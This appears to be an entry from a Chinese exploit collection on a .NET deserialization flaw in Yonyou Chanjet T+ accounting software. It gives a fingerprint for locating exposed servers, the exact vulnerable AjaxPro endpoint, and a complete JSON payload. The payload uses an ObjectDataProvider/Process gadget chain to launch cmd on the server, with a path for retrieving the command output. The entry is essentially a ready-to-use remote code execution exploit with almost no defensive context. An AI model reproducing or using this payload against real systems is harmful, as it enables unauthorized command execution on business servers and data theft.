# 用友畅捷通TPlusUfida.T.DI.UIP.net反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app.name="畅捷通 T+"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1`
- **关键头**：`Content-Length: 601`　`Content-Type: application/json`

**请求体 / payload**
```
"storeID": {
"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
"MethodName": "Start",
"ObjectInstance": {
"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"StartInfo": {
"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"FileName": "cmd",
"Arguments": "/c echo baidubaidu > baidu.txt"

获取命令执行结果
/tplus/baidu.txt
```

**其他**
- 用友畅捷通TPlus Ufida.T.DI.UIP .net反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友畅捷通TPlus